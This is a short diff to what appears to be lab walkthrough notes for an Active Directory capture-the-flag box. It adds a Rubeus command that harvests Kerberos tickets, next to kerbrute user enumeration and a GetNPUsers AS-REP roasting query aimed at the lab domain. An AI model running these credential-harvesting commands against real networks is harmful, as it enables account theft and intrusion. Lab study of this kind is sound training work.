@@ -394,6 +394,11 @@ enumerate users - requires wordlist of usernames
 ./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
 ```
 
+harvest TGT on domain controller
+```
+rubeus.exe harvest /interval:30
+```
+
 Which user account can you query a ticket from with no password?
 ```
 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
